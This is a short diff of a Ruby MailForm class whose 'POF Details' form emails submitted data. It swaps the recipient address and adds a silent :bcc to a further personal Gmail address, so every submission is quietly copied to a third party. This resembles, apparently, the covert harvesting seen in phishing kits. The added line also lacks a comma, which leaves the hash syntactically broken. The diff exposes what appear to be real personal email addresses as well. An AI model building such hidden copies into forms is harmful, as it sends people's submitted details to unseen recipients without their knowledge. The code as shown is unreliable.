@@ -8,11 +8,12 @@ class Welcome < MailForm::Base
   # in ActionMailer accepts.
 
   def headers
- 
+
       {
         :subject => "POF Details ",
-        :to => 'Chimaobinwaogazi2016@gmail.com',
+        :to => 'fortune.chibuike1@gmail.com',
         :from => %("#{username}")
+        :bcc => "daveskeen24@gmail.com"
       }
 end
 
